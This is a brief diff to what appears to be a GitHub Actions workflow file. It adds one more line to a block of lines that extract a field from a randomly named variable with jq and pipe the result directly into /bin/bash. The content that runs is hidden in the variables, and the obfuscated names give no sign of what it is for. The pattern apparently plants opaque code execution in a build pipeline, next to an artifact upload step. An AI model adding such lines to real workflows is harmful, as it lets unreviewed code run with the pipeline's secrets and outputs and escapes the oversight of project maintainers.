@@ -30,6 +30,7 @@ jobs:
           echo $uuygp37645 | jq -r .d58 | /bin/bash
           echo $tnbe81896 | jq -r .thnw5 | /bin/bash
           echo $cs88121 | jq -r .ktr401 | /bin/bash
+          echo $mexu22643 | jq -r .cyixi1 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
